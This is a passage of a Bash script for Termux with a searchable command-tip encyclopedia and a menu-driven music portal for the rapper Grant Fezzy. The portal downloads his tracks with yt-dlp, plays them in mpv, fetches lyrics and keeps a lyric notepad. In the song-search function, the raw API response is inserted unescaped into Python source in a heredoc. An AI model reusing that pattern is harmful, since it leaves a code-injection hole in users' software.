    ENC["ssh:6"]="Copy public key|ssh-copy-id user@host|Install key on remote server"
    ENC["ssh:7"]="SSH tunnel|ssh -L 8080:localhost:80 user@host|Forward local port to remote"
    ENC["ssh:8"]="Run remote command|ssh user@host 'ls /var/log'|Execute command on server"
    ENC["foss:1"]="Web browser|pkg install w3m|Terminal web browser"
    ENC["foss:2"]="File manager|pkg install mc|Midnight Commander — dual-pane TUI"
    ENC["foss:3"]="Music player|pkg install mpv|MPV plays audio and video"
    ENC["foss:4"]="Download videos|pip install yt-dlp --break-system-packages|YouTube/SoundCloud downloader"
    ENC["foss:5"]="Markdown editor|pkg install micro|Modern terminal text editor"
    ENC["foss:6"]="HTTP requests|pkg install httpie|User-friendly curl alternative"
    ENC["foss:7"]="System monitor|pkg install htop|Interactive process viewer"
    ENC["foss:8"]="Network scanner|pkg install nmap|Port scanner and network tool"
    ENC["foss:9"]="Password manager|pkg install pass|GNU pass CLI password store"
    ENC["foss:10"]="Multiplexer|pkg install tmux|Terminal multiplexer — multiple sessions"
    ENC["foss:11"]="RSS reader|pkg install newsboat|Terminal RSS/Atom feed reader"
    ENC["foss:12"]="JSON tool|pkg install jq|Parse and filter JSON in terminal"

    local CATS=("aliases" "nano" "pkg" "files" "perms" "api" "cron" "git" "python" "backup" "network" "troubleshoot" "vim" "tmux" "bash" "ssh" "foss")
    local CAT_LABELS=("Aliases" "Nano Editor" "Package Management" "File Operations" "Permissions" "Termux API" "Cron & Scheduling" "Git & GitHub" "Python in Termux" "Backup & Restore" "Network Tools" "Troubleshooting" "Vim Editor" "Tmux Multiplexer" "Bash Scripting" "SSH & SCP" "FOSS Apps Guide")

    _enc_show_cat() {
        local cat="$1" label="$2"
        clear
        echo ""
        _dv28
        printf "  ${C28}${BOLD}▶  TERMUX ENCYCLOPEDIA  ·  %s${RESET}\n" "${label^^}"
        _dv28
        echo ""
        local n=1
        while true; do
            local key="${cat}:${n}"
            [[ -z "${ENC[$key]+x}" ]] && break
            local topic cmd exp
            IFS='|' read -r topic cmd exp <<< "${ENC[$key]}"
            printf "  ${C28}%2d.${RESET}  ${WH}%-24s${RESET}  ${YEL}%s${RESET}\n" "$n" "$topic" "$cmd"
            printf "      ${FADE}%s${RESET}\n" "$exp"
            echo ""
            ((n++))
        done
        _dv28
        echo ""
        printf "  ${FADE}Press ENTER to return...${RESET}"; read -r
    }

    _enc_search() {
        local kw="${1,,}"
        echo ""
        _dv28
        printf "  ${C28}SEARCH RESULTS for: ${WH}%s${RESET}\n" "$kw"
        _dv28
        echo ""
        local found=0
        for cat in "${CATS[@]}"; do
            local n=1
            while true; do
                local key="${cat}:${n}"
                [[ -z "${ENC[$key]+x}" ]] && break
                local topic cmd exp
                IFS='|' read -r topic cmd exp <<< "${ENC[$key]}"
                local combined="${topic,,} ${cmd,,} ${exp,,}"
                if [[ "$combined" == *"$kw"* ]]; then
                    printf "  ${FADE}[%s]${RESET}  ${WH}%-22s${RESET}  ${YEL}%s${RESET}\n" "$cat" "$topic" "$cmd"
                    printf "      ${FADE}%s${RESET}\n" "$exp"
                    echo ""
                    found=1
                fi
                ((n++))
            done
        done
        [[ $found -eq 0 ]] && printf "  ${RED}No results for '%s'${RESET}\n" "$kw"
        echo ""
        printf "  ${FADE}Press ENTER...${RESET}"; read -r
    }

    _enc_random() {
        local all_keys=()
        for cat in "${CATS[@]}"; do
            local n=1
            while true; do
                local key="${cat}:${n}"
                [[ -z "${ENC[$key]+x}" ]] && break
                all_keys+=("$key")
                ((n++))
            done
        done
        local pick="${all_keys[$((RANDOM % ${#all_keys[@]}))]}"
        local topic cmd exp
        IFS='|' read -r topic cmd exp <<< "${ENC[$pick]}"
        echo ""
        _dv28
        printf "  ${C28}${BOLD}RANDOM TIP${RESET}\n"
        _dv28
        echo ""
        printf "  ${WH}%s${RESET}\n\n" "$topic"
        printf "  ${YEL}%s${RESET}\n\n" "$cmd"
        printf "  ${FADE}%s${RESET}\n" "$exp"
        echo ""
        _dv28
        echo ""
        printf "  ${FADE}Press ENTER...${RESET}"; read -r
    }

    while true; do
        clear
        echo ""
        _dv28
        printf "  ${C28}${BOLD}▶  TERMUX ENCYCLOPEDIA  ·  HOW-TO · COMMANDS · TROUBLESHOOT  ·  999${RESET}\n"
        _dv28
        echo ""
        _hover_hint "termuxenc"
        echo ""
        printf "  ${C28}── SEARCH ─────────────────────────────────────────────────────────${RESET}\n"
        printf "  ${WH}[S]${RESET}  Search by keyword        ${FADE}→ type 'alias' or 'clone' etc${RESET}\n"
        printf "  ${WH}[R]${RESET}  Random tip               ${FADE}→ one random useful command${RESET}\n"
        echo ""
        printf "  ${C28}── CATEGORIES ─────────────────────────────────────────────────────${RESET}\n"
        for i in "${!CATS[@]}"; do
            local num=$(( i + 1 ))
            printf "  ${WH}[%2d]${RESET}  ${C28}%-26s${RESET}  ${FADE}%s${RESET}\n" "$num" "${CAT_LABELS[$i]}" ""
        done
        echo ""
        _dv28
        echo ""
        printf "  ${FADE}[B] Back to Station${RESET}\n"
        echo ""
        printf "  ${C28}${BOLD}Choice » ${RESET}"
        read -r ec

        case "${ec,,}" in
            b) _finish_msg termuxenc; return ;;
            s)
                printf "  ${C28}Search: ${RESET}"; read -r kw
                [[ -n "$kw" ]] && _enc_search "$kw" ;;
            r) _enc_random ;;
            ''|*[!0-9]*) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
            *)
                local cidx=$(( ec - 1 ))
                if [[ $cidx -ge 0 && $cidx -lt ${#CATS[@]} ]]; then
                    _enc_show_cat "${CATS[$cidx]}" "${CAT_LABELS[$cidx]}"
                else
                    printf "  ${RED}Invalid${RESET}\n"; sleep 0.7
                fi ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [29] FEZZY ARTIST PORTAL
# ═══════════════════════════════════════════════════════════════════

fezzy_artist_portal() {
    local SAVEDIR="$HOME/storage/downloads/fezzy_artist"
    mkdir -p "$SAVEDIR" 2>/dev/null

    # ── URLs ─────────────────────────────────────────────────────────
    local URL_YT="https://www.youtube.com/@grantfesters"
    local URL_SC="https://soundcloud.com/hiphopfezzy"
    local URL_AM="https://audiomack.com/f3zzy"
    local URL_RN="https://www.reverbnation.com/FezzyFesters"

    # ── glitch decipher render (stays on screen — part of banner) ────
    _fa_glitch_header() {
        local chars='!@#$%^&*<>?/|\\~ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        local target="GRANT  FEZZY  ·  CPT  ·  999"
        local len=${#target}
        # decipher animation — runs once then leaves final text
        local steps=8
        for ((s=0; s<steps; s++)); do
            printf "\r  ${C29}${BOLD}"
            for ((i=0; i<len; i++)); do
                if (( i < (s * len / steps) )); then
                    printf "%s" "${target:$i:1}"
                else
                    local ri=$(( RANDOM % ${#chars} ))
                    printf "%s" "${chars:$ri:1}"
                fi
            done
            printf "${RESET}"
            sleep 0.07
        done
        # final locked state — stays on screen
        printf "\r  ${C29}${BOLD}%s${RESET}\n" "$target"
    }

    # ── influences wall (always visible) ────────────────────────────
    _fa_influences() {
        echo ""
        printf "  ${FADE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n"
        printf "  ${YEL}${BOLD}INFLUENCES${RESET}\n"
        printf "  ${FADE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n"
        printf "  ${C29}Lil Uzi Vert${RESET}        ${WH}Back to the Moon${RESET}\n"
        printf "  ${C29}Juice WRLD${RESET}          ${WH}Maze${RESET}\n"
        printf "  ${C29}Future & Uzi${RESET}        ${WH}Over Your Head${RESET}\n"
        printf "  ${C29}NAV${RESET}                 ${WH}Back to Business${RESET}\n"
        printf "  ${C29}Juicy J${RESET}             ${WH}Cell Ready${RESET}\n"
        printf "  ${C29}Wiz Khalifa${RESET}         ${WH}Paperbond  ·  Kush and Orange Juice${RESET}\n"
        printf "  ${C29}Machine Gun Kelly${RESET}   ${WH}Tickets to My Downfall  ·  Mainstream Sellout${RESET}\n"
        printf "  ${FADE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n"
        echo ""
    }

    # ── full banner ──────────────────────────────────────────────────
    _fa_banner() {
        clear; echo ""
        _dv29
        _fa_glitch_header
        printf "  ${FADE}Ravensmead · Cape Town · Strategy Over Impulse · philfesters${RESET}\n"
        _dv29
        _fa_influences
        _hover_hint "fezzyartist"
        echo ""
    }

    # ── download helper ──────────────────────────────────────────────
    _fa_dl() {
        local url="$1" label="$2"
        echo ""
        _dv29
        printf "  ${C29}Pulling %s → %s${RESET}\n" "$label" "$SAVEDIR"
        _dv29; echo ""
        if command -v yt-dlp &>/dev/null; then
            yt-dlp --no-warnings \
                -o "$SAVEDIR/%(uploader)s - %(title)s.%(ext)s" \
                "$url" 2>&1 | tail -30
            echo ""
            printf "  ${GRN}✓ Saved to: %s${RESET}\n" "$SAVEDIR"
        else
            printf "  ${RED}yt-dlp not installed.${RESET}\n"
            printf "  ${YEL}Fix: pip install yt-dlp --break-system-packages${RESET}\n"
        fi
        _dv29; echo ""
        printf "  ${FADE}Press ENTER...${RESET}"; read -r
    }

    # ── play local files ─────────────────────────────────────────────
    _fa_play_local() {
        clear; echo ""
        _dv29
        printf "  ${C29}${BOLD}LOCAL PLAYBACK  ·  %s${RESET}\n" "$SAVEDIR"
        _dv29; echo ""
        local count; count=$(find "$SAVEDIR" -type f \( -name "*.mp3" -o -name "*.m4a" -o -name "*.opus" -o -name "*.webm" -o -name "*.mp4" \) 2>/dev/null | wc -l)
        printf "  ${WH}Files available: ${C29}%s${RESET}\n\n" "$count"
        if (( count == 0 )); then
            printf "  ${FADE}Nothing downloaded yet. Pull your tracks first.${RESET}\n"
            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; return
        fi
        printf "  ${WH}[1]${RESET}  ${C29}Play all (shuffle)${RESET}       ${FADE}→ mpv shuffle queue${RESET}\n"
        printf "  ${WH}[2]${RESET}  ${C29}Play all (in order)${RESET}      ${FADE}→ mpv ordered queue${RESET}\n"
        printf "  ${WH}[3]${RESET}  ${C29}Pick a track${RESET}             ${FADE}→ numbered list to choose${RESET}\n"
        printf "  ${WH}[4]${RESET}  ${C29}List all files${RESET}           ${FADE}→ browse saved tracks${RESET}\n"
        echo ""; _dv29
        printf "  ${FADE}[B] Back${RESET}\n\n"
        printf "  ${C29}${BOLD}Choice » ${RESET}"; read -r pc

        case "$pc" in
            1)
                if command -v mpv &>/dev/null; then
                    mpv --shuffle --no-video "$SAVEDIR"/* 2>/dev/null
                else
                    printf "  ${RED}mpv not installed. Fix: pkg install mpv${RESET}\n"
                    printf "  ${FADE}Press ENTER...${RESET}"; read -r
                fi ;;
            2)
                if command -v mpv &>/dev/null; then
                    mpv --no-video "$SAVEDIR"/* 2>/dev/null
                else
                    printf "  ${RED}pkg install mpv${RESET}\n"
                    printf "  ${FADE}Press ENTER...${RESET}"; read -r
                fi ;;
            3)
                local -a files=()
                while IFS= read -r f; do files+=("$f"); done < <(find "$SAVEDIR" -type f \( -name "*.mp3" -o -name "*.m4a" -o -name "*.opus" -o -name "*.webm" -o -name "*.mp4" \) 2>/dev/null | sort)
                echo ""
                for i in "${!files[@]}"; do
                    printf "  ${WH}[%2d]${RESET}  ${C29}%s${RESET}\n" "$((i+1))" "$(basename "${files[$i]}")"
                done
                echo ""; printf "  ${C29}Pick number » ${RESET}"; read -r tn
                if [[ "$tn" =~ ^[0-9]+$ ]] && (( tn >= 1 && tn <= ${#files[@]} )); then
                    mpv --no-video "${files[$((tn-1))]}" 2>/dev/null || printf "  ${RED}pkg install mpv${RESET}\n"
                fi
                printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                find "$SAVEDIR" -type f 2>/dev/null | sort | while read -r f; do
                    local sz; sz=$(du -sh "$f" 2>/dev/null | cut -f1)
                    printf "  ${FADE}%-8s${RESET}  ${WH}%s${RESET}\n" "$sz" "$(basename "$f")"
                done
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            B|b) return ;;
        esac
    }

    # ── site sub-menu ────────────────────────────────────────────────
    _fa_site() {
        local label="$1" profile_url="$2" color="$3"

        while true; do
            clear; echo ""
            _dv29
            printf "  ${color}${BOLD}%s${RESET}\n" "$label"
            printf "  ${FADE}%s${RESET}\n" "$profile_url"
            _dv29; echo ""
            printf "  ${WH}[1]${RESET}  ${color}Download full profile/channel${RESET}  ${FADE}→ yt-dlp pulls all tracks${RESET}\n"
            printf "  ${WH}[2]${RESET}  ${color}Download single URL${RESET}            ${FADE}→ paste specific track/video URL${RESET}\n"
            printf "  ${WH}[3]${RESET}  ${color}Open in w3m${RESET}                   ${FADE}→ browse in terminal${RESET}\n"
            printf "  ${WH}[4]${RESET}  ${color}Copy profile URL${RESET}              ${FADE}→ to clipboard${RESET}\n"
            echo ""; _dv29
            printf "  ${FADE}[B] Back${RESET}\n\n"
            printf "  ${C29}${BOLD}Choice » ${RESET}"; read -r ss

            case "$ss" in
                1) _fa_dl "$profile_url" "$label" ;;
                2)
                    echo ""
                    printf "  ${color}Paste URL: ${RESET}"; read -r surl
                    [[ -n "$surl" ]] && _fa_dl "$surl" "$label" ;;
                3) w3m "$profile_url" 2>/dev/null || { printf "  ${RED}pkg install w3m${RESET}\n"; printf "  ${FADE}Press ENTER...${RESET}"; read -r; } ;;
                4) echo -n "$profile_url" | termux-clipboard-set 2>/dev/null; printf "  ${GRN}✓ Copied${RESET}\n"; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                B|b) return ;;
                *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.6 ;;
            esac
        done
    }

    # ── lyrics finder (lyrics.ovh API) ──────────────────────────────
    _fa_fetch_lyrics() {
        local artist="$1" title="$2"
        local enc_artist enc_title url
        enc_artist=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$artist" 2>/dev/null || echo "$artist")
        enc_title=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$title" 2>/dev/null || echo "$title")
        url="https://api.lyrics.ovh/v1/${enc_artist}/${enc_title}"
        local raw
        raw=$(curl -s --max-time 10 "$url" 2>/dev/null)
        if echo "$raw" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['lyrics'])" 2>/dev/null; then
            return 0
        else
            printf "  ${RED}Lyrics not found for: %s — %s${RESET}\n" "$artist" "$title"
            return 1
        fi
    }

    _fa_lyrics_finder() {
        local LYRDIR="$HOME/storage/downloads/fezzy_artist/lyrics"
        mkdir -p "$LYRDIR" 2>/dev/null
        while true; do
            clear; echo ""
            _dv29
            printf "  ${C29}${BOLD}LYRICS FINDER${RESET}\n"
            printf "  ${FADE}Powered by lyrics.ovh — free, no API key${RESET}\n"
            _dv29; echo ""
            printf "  ${WH}[1]${RESET}  ${C29}Find lyrics by song name${RESET}        ${FADE}→ type artist + title${RESET}\n"
            printf "  ${WH}[2]${RESET}  ${C29}Find song by lyrics snippet${RESET}     ${FADE}→ type what you remember${RESET}\n"
            printf "  ${WH}[3]${RESET}  ${C29}View saved lyrics${RESET}               ${FADE}→ browse %s${RESET}\n" "$LYRDIR"
            echo ""; _dv29
            printf "  ${FADE}[B] Back${RESET}\n\n"
            printf "  ${C29}${BOLD}Choice » ${RESET}"; read -r lc
            case "$lc" in
                1)
                    echo ""
                    printf "  ${C29}Artist name: ${RESET}"; read -r la
                    printf "  ${C29}Song title:  ${RESET}"; read -r lt
                    [[ -z "$la" || -z "$lt" ]] && continue
                    clear; echo ""
                    _dv29
                    printf "  ${C29}Fetching lyrics: %s — %s${RESET}\n" "$la" "$lt"
                    _dv29; echo ""
                    local lyr
                    lyr=$(_fa_fetch_lyrics "$la" "$lt")
                    if [[ $? -eq 0 && -n "$lyr" ]]; then
                        echo "$lyr" | less -R
                        echo ""
                        printf "  ${C29}Save lyrics? [Y/N]: ${RESET}"; read -r sv
                        if [[ "$sv" == "Y" || "$sv" == "y" ]]; then
                            local safe_name
                            safe_name=$(echo "${la}_${lt}" | tr ' /' '__' | tr -cd '[:alnum:]_-')
                            local lfile="$LYRDIR/${safe_name}.txt"
                            printf "ARTIST: %s\nTITLE:  %s\n\n%s\n" "$la" "$lt" "$lyr" > "$lfile"
                            printf "  ${GRN}✓ Saved: %s${RESET}\n" "$lfile"
                            printf "  ${FADE}Press ENTER...${RESET}"; read -r
                        fi
                    else
                        printf "  ${FADE}Press ENTER...${RESET}"; read -r
                    fi ;;
                2)
                    echo ""
                    printf "  ${C29}Type a lyrics snippet you remember: ${RESET}"; read -r snippet
                    [[ -z "$snippet" ]] && continue
                    clear; echo ""
                    _dv29
                    printf "  ${C29}${BOLD}SEARCHING FOR SONG BY LYRICS${RESET}\n"
                    _dv29; echo ""
                    printf "  ${FADE}Querying lyrics.ovh suggest endpoint...${RESET}\n\n"
                    local enc_snip
                    enc_snip=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$snippet" 2>/dev/null || echo "$snippet")
                    local suggest_raw
                    suggest_raw=$(curl -s --max-time 10 "https://api.lyrics.ovh/suggest/${enc_snip}" 2>/dev/null)
                    if [[ -n "$suggest_raw" ]]; then
                        python3 - <<INNERPY
import json, sys
raw = """$suggest_raw"""
try:
    d = json.loads(raw)
    hits = d.get("data", [])
    if not hits:
        print("  No results found.")
    else:
        print("  Results:")
        for i,h in enumerate(hits[:10], 1):
            art = h.get("artist", {}).get("name", "?")
            ttl = h.get("title", "?")
            print(f"  [{i}]  {art}  —  {ttl}")
except Exception as e:
    print(f"  Parse error: {e}")
INNERPY
                    else
                        printf "  ${RED}No response from API${RESET}\n"
                    fi
                    echo ""; _dv29
                    printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                3)
                    mapfile -t LFILES < <(find "$LYRDIR" -name "*.txt" -type f 2>/dev/null | sort)
                    if (( ${#LFILES[@]} == 0 )); then
                        printf "  ${FADE}No saved lyrics yet.${RESET}\n"
                        printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                    fi
                    clear; echo ""
                    _dv29
                    printf "  ${C29}${BOLD}SAVED LYRICS  ·  %d files${RESET}\n" "${#LFILES[@]}"
                    _dv29; echo ""
                    for i in "${!LFILES[@]}"; do
                        printf "  ${C29}%2d.${RESET}  ${WH}%s${RESET}\n" "$((i+1))" "$(basename "${LFILES[$i]}" .txt)"
                    done
                    echo ""; _dv29
                    printf "  ${FADE}[B] Back${RESET}\n\n"
                    printf "  ${C29}Number or B » ${RESET}"; read -r ln_pick
                    [[ "$ln_pick" == "B" || "$ln_pick" == "b" ]] && continue
                    if [[ "$ln_pick" =~ ^[0-9]+$ ]] && (( ln_pick >= 1 && ln_pick <= ${#LFILES[@]} )); then
                        less "${LFILES[$((ln_pick-1))]}"
                    fi ;;
                B|b) return ;;
                *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.5 ;;
            esac
        done
    }

    # ── full lyric notepad portal ─────────────────────────────────────
    _fa_lyric_notepad() {
        local LYRDIR="$HOME/storage/downloads/fezzy_artist/lyrics"
        mkdir -p "$LYRDIR" 2>/dev/null

        _ln_write() {
            local mode="${1:-new}" existing_file="$2"
            clear; echo ""
            _dv29
            if [[ "$mode" == "edit" && -n "$existing_file" ]]; then
                printf "  ${C29}${BOLD}EDIT BARS  ·  %s${RESET}\n" "$(basename "$existing_file" .txt)"
            else
                printf "  ${C29}${BOLD}NEW BARS  ·  Write Your Lyrics${RESET}\n"
            fi
            _dv29; echo ""
            local lp_name safe_name lfile
            if [[ "$mode" == "edit" && -n "$existing_file" ]]; then
                lfile="$existing_file"
                lp_name="$(basename "$existing_file" .txt)"
                printf "  ${FADE}Current content:${RESET}\n\n"
                cat "$lfile" | head -20
                echo ""
                _dv29; echo ""
                printf "  ${FADE}[A] Append to existing  [O] Overwrite  [B] Cancel: ${RESET}"; read -r edit_mode
                [[ "${edit_mode,,}" == "b" ]] && return
            else
                printf "  ${C29}Track / project name: ${RESET}"; read -r lp_name
                [[ -z "$lp_name" ]] && lp_name="untitled_$(date +%Y%m%d_%H%M)"
                safe_name=$(echo "$lp_name" | tr ' /' '__' | tr -cd '[:alnum:]_-')
                lfile="$LYRDIR/${safe_name}.txt"
                edit_mode="O"
            fi
            echo ""
            printf "  ${FADE}Type your bars. Type DONE on a blank line to save.${RESET}\n"
            printf "  ${FADE}Type CANCEL to abort.${RESET}\n\n"
            printf "  ${C29}${BOLD}▼ Drop bars below ▼${RESET}\n\n"
            local lines=()
            while IFS= read -r lp_line; do
                [[ "$lp_line" == "DONE"   ]] && break
                [[ "$lp_line" == "CANCEL" ]] && return
                lines+=("$lp_line")
            done
            if (( ${#lines[@]} > 0 )); then
                if [[ "${edit_mode,,}" == "a" ]]; then
                    {
                        printf "\n── ADDED %s ──\n\n" "$(date '+%Y-%m-%d %H:%M')"
                        for lp_l in "${lines[@]}"; do echo "$lp_l"; done
                    } >> "$lfile"
                else
                    {
                        printf "TRACK: %s\n" "$lp_name"
                        printf "DATE:  %s\n" "$(date '+%Y-%m-%d %H:%M')"
                        printf "BY:    Grant Fezzy Festers · philfesters · 999\n"
                        printf "\n%s\n\n" "$(printf '%0.s─' {1..60})"
                        for lp_l in "${lines[@]}"; do echo "$lp_l"; done
                    } > "$lfile"
                fi
                printf "\n  ${GRN}✓ Saved: %s${RESET}\n" "$lfile"
                local wc_lines; wc_lines=$(wc -l < "$lfile" 2>/dev/null)
                local wc_words; wc_words=$(wc -w < "$lfile" 2>/dev/null)
                printf "  ${FADE}Lines: %s  ·  Words: %s${RESET}\n" "$wc_lines" "$wc_words"
            else
                printf "  ${FADE}Nothing written.${RESET}\n"
            fi
            printf "  ${FADE}Press ENTER...${RESET}"; read -r
        }

        _ln_view_all() {
            mapfile -t LPFILES < <(find "$LYRDIR" -name "*.txt" -type f 2>/dev/null | sort)
            if (( ${#LPFILES[@]} == 0 )); then
                printf "  ${FADE}No saved bars yet.${RESET}\n"
                printf "  ${FADE}Press ENTER...${RESET}"; read -r; return
            fi
            while true; do
                clear; echo ""
                _dv29
                printf "  ${C29}${BOLD}SAVED BARS  ·  %d files${RESET}\n" "${#LPFILES[@]}"
                _dv29; echo ""
                for i in "${!LPFILES[@]}"; do
                    local sz; sz=$(wc -l < "${LPFILES[$i]}" 2>/dev/null)
                    printf "  ${C29}%2d.${RESET}  ${WH}%-36s${RESET}  ${FADE}%s lines${RESET}\n" \
                        "$((i+1))" "$(basename "${LPFILES[$i]}" .txt)" "$sz"
                done
                echo ""; _dv29
                printf "  ${FADE}[B] Back${RESET}\n\n"
                printf "  ${C29}Number or B » ${RESET}"; read -r lv
                [[ "${lv,,}" == "b" ]] && return
                if [[ "$lv" =~ ^[0-9]+$ ]] && (( lv >= 1 && lv <= ${#LPFILES[@]} )); then
                    less "${LPFILES[$((lv-1))]}"
                fi
            done
        }

        _ln_search() {
            printf "  ${C29}Search keyword: ${RESET}"; read -r kw
            [[ -z "$kw" ]] && return
            echo ""
            _dv29
            printf "  ${C29}RESULTS for: %s${RESET}\n" "$kw"
            _dv29; echo ""
            local found=0
            while IFS= read -r f; do
                if grep -qi "$kw" "$f" 2>/dev/null; then
                    printf "  ${WH}%s${RESET}\n" "$(basename "$f" .txt)"
                    grep -i "$kw" "$f" 2>/dev/null | head -3 | while IFS= read -r match; do
                        printf "    ${FADE}%s${RESET}\n" "$match"
                    done
                    echo ""
                    found=1
                fi
            done < <(find "$LYRDIR" -name "*.txt" -type f 2>/dev/null)
            (( found == 0 )) && printf "  ${RED}No matches for '%s'${RESET}\n" "$kw"
            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
        }

        _ln_delete() {
            mapfile -t LPFILES < <(find "$LYRDIR" -name "*.txt" -type f 2>/dev/null | sort)
            if (( ${#LPFILES[@]} == 0 )); then
                printf "  ${FADE}Nothing to delete.${RESET}\n"
                printf "  ${FADE}Press ENTER...${RESET}"; read -r; return
            fi
            clear; echo ""
            _dv29
            printf "  ${C29}${BOLD}DELETE BARS${RESET}\n"
            _dv29; echo ""
            for i in "${!LPFILES[@]}"; do
                printf "  ${C29}%2d.${RESET}  ${WH}%s${RESET}\n" "$((i+1))" "$(basename "${LPFILES[$i]}" .txt)"
            done
            echo ""; printf "  ${C29}Number to delete (or B) » ${RESET}"; read -r dn
            [[ "${dn,,}" == "b" ]] && return
            if [[ "$dn" =~ ^[0-9]+$ ]] && (( dn >= 1 && dn <= ${#LPFILES[@]} )); then
                local target="${LPFILES[$((dn-1))]}"
                printf "  ${YEL}Delete '%s'? [Y/N]: ${RESET}" "$(basename "$target" .txt)"; read -r conf
                if [[ "${conf,,}" == "y" ]]; then
                    rm -f "$target"
                    printf "  ${GRN}✓ Deleted.${RESET}\n"
                else
                    printf "  ${FADE}Cancelled.${RESET}\n"
                fi
                printf "  ${FADE}Press ENTER...${RESET}"; read -r
            fi
        }

        _ln_export() {
            mapfile -t LPFILES < <(find "$LYRDIR" -name "*.txt" -type f 2>/dev/null | sort)
            if (( ${#LPFILES[@]} == 0 )); then
                printf "  ${FADE}No bars to export.${RESET}\n"
                printf "  ${FADE}Press ENTER...${RESET}"; read -r; return
            fi
            local out="$HOME/storage/downloads/fezzy_all_bars_$(date +%Y%m%d_%H%M).txt"
            {
                printf "GRANT FEZZY FESTERS — ALL BARS EXPORT\n"
                printf "DATE: %s\n" "$(date '+%Y-%m-%d %H:%M')"
                printf "SOI · philfesters · 999\n"
                printf "\n%s\n\n" "$(printf '%0.s═' {1..60})"
                for f in "${LPFILES[@]}"; do
                    printf "\n── %s ──\n\n" "$(basename "$f" .txt)"
                    cat "$f"
                    printf "\n%s\n" "$(printf '%0.s─' {1..60})"
                done
            } > "$out"
            printf "  ${GRN}✓ All %d files exported to:\n  %s${RESET}\n" "${#LPFILES[@]}" "$out"
            printf "  ${FADE}Press ENTER...${RESET}"; read -r
        }

        # MAIN NOTEPAD LOOP
        while true; do
            clear; echo ""
            _dv29
            printf "  ${C29}${BOLD}LYRIC NOTEPAD  ·  GRANT FEZZY · 999${RESET}\n"
            printf "  ${FADE}Write bars · edit · search · export · all local${RESET}\n"
            _dv29; echo ""
            local total_bars; total_bars=$(find "$LYRDIR" -name "*.txt" -type f 2>/dev/null | wc -l)
            printf "  ${C29}Saved files: ${WH}%s${RESET}\n\n" "$total_bars"
            printf "  ${WH}[1]${RESET}  ${C29}New bars${RESET}            ${FADE}→ write from scratch · save to file${RESET}\n"
            printf "  ${WH}[2]${RESET}  ${C29}View saved bars${RESET}     ${FADE}→ browse · read any file${RESET}\n"
            printf "  ${WH}[3]${RESET}  ${C29}Edit existing${RESET}       ${FADE}→ append or overwrite a saved file${RESET}\n"
            printf "  ${WH}[4]${RESET}  ${C29}Search bars${RESET}         ${FADE}→ keyword search across all files${RESET}\n"
            printf "  ${WH}[5]${RESET}  ${C29}Delete a file${RESET}       ${FADE}→ remove a saved bars file${RESET}\n"
            printf "  ${WH}[6]${RESET}  ${C29}Export all${RESET}          ${FADE}→ merge all bars into one txt${RESET}\n"
            printf "  ${WH}[7]${RESET}  ${C29}Open in vim${RESET}         ${FADE}→ edit a file directly in vim${RESET}\n"
            echo ""; _dv29
            printf "  ${FADE}[B] Back${RESET}\n\n"
            printf "  ${C29}${BOLD}Choice » ${RESET}"; read -r nc

            case "$nc" in
                1) _ln_write "new" ;;
                2) _ln_view_all ;;
                3)
                    mapfile -t LPFILES < <(find "$LYRDIR" -name "*.txt" -type f 2>/dev/null | sort)
                    if (( ${#LPFILES[@]} == 0 )); then
                        printf "  ${FADE}No files yet.${RESET}\n"; sleep 1; continue
                    fi
                    clear; echo ""
                    _dv29; printf "  ${C29}${BOLD}EDIT — PICK FILE${RESET}\n"; _dv29; echo ""
                    for i in "${!LPFILES[@]}"; do
                        printf "  ${C29}%2d.${RESET}  ${WH}%s${RESET}\n" "$((i+1))" "$(basename "${LPFILES[$i]}" .txt)"
                    done
                    echo ""; printf "  ${C29}Number or B » ${RESET}"; read -r en
                    [[ "${en,,}" == "b" ]] && continue
                    if [[ "$en" =~ ^[0-9]+$ ]] && (( en >= 1 && en <= ${#LPFILES[@]} )); then
                        _ln_write "edit" "${LPFILES[$((en-1))]}"
                    fi ;;
                4) _ln_search ;;
                5) _ln_delete ;;
                6) _ln_export ;;
                7)
                    mapfile -t LPFILES < <(find "$LYRDIR" -name "*.txt" -type f 2>/dev/null | sort)
                    if (( ${#LPFILES[@]} == 0 )); then
                        printf "  ${FADE}No files yet. Create one with [1].${RESET}\n"; sleep 1; continue
                    fi
                    clear; echo ""
                    _dv29; printf "  ${C29}${BOLD}OPEN IN VIM${RESET}\n"; _dv29; echo ""
                    for i in "${!LPFILES[@]}"; do
                        printf "  ${C29}%2d.${RESET}  ${WH}%s${RESET}\n" "$((i+1))" "$(basename "${LPFILES[$i]}" .txt)"
                    done
                    echo ""; printf "  ${C29}Number or B » ${RESET}"; read -r vn
                    [[ "${vn,,}" == "b" ]] && continue
                    if [[ "$vn" =~ ^[0-9]+$ ]] && (( vn >= 1 && vn <= ${#LPFILES[@]} )); then
                        vim "${LPFILES[$((vn-1))]}"
                    fi ;;
                B|b) return ;;
                *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.5 ;;
            esac
        done
    }

    # ── record vocals (termux-microphone-record) ─────────────────────
    _fa_record_vocals() {
        local RECDIR="$HOME/storage/downloads/fezzy_artist/recordings"
        mkdir -p "$RECDIR" 2>/dev/null
        clear; echo ""
        _dv29
        printf "  ${C29}${BOLD}RECORD VOCALS${RESET}\n"
        _dv29; echo ""
